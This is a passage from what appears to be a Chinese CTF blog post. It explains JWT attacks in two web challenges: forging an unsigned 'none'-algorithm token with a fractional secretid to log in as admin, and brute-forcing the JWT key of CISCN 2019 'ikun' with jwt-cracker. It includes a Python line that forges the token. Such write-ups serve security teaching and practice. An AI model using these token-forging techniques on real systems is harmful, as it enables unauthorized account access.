router.routes();&#125;;\n\n访问/controllers/api.js前端几个能看到的功能接口逻辑都在了，分析登录和注册接口\n# 注册：const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);const secretid = global.secrets.length;global.secrets.push(secret)const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);# 登录：const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;console.log(sid)if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;         throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);&#125;const secret = global.secrets[sid];const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);\n\n我们看到secretid值校验，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。JavaScript 是一门弱类型语言，可以通过空数组与数字比较永远为真或是小数来绕过，而这个题利用的是 将加密方式改为’none’ 的方法，\nprint(jwt.encode(&#123;&quot;secretid&quot;:0.1,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;).decode(&#x27;utf-8&#x27;))\n\n把生成的值替换authorization的值就通过验证了\n\n登入之后点击get flag，权限足够，获得flag\n\nCISCN 2019 华北赛区 Web - ikun复现环境https://buuoj.cn/challenges\n题解当然这道题还涉及逻辑漏洞和python反序列化，我们在这只提一下JWT部分，详细的WP师傅们可以在网上找到。\n&#x2F;b1g_m4mber这个页面，提示只允许admin访问\n\n既然提示要admin，那基本上跟cookie有关，查看一下cookie，发现是JWT\n解码可得：\n\n而这道题对于jwt的解法是爆破密钥，我们用到一个叫jwt-cracker的工具来爆破密钥。\n当然 之前提到的 JWT tool 也支持密钥爆破。\n\n爆破出来密钥为1Kun，修改用户名为admin，修改token重放：\n\n接下来就是python反序列化了：\n\nEnd\nTool:\n\nhttps://github.com/ticarpi/jwt_tool\nhttps://github.com/brendan-rius/c-jwt-cracker\n\nReference\n\nhttps://github.com/ticarpi/jwt_tool/wiki\nhttps://saucer-man.com/information_security/377.html\nhttps://xz.aliyun.com/t/9376#toc-0\n","categories":["CTF"],"tags":["Web"]}]